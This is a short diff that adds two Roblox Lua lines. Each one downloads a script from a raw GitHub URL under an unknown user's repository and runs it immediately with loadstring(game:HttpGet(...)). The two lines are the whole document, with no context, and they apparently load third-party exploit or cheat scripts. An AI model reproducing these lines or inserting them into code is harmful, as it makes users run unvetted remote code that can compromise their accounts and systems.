@@ -1,0 +1,4 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/oop928/boss/refs/heads/main/O"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/oop928/dan191/refs/heads/main/191"))()
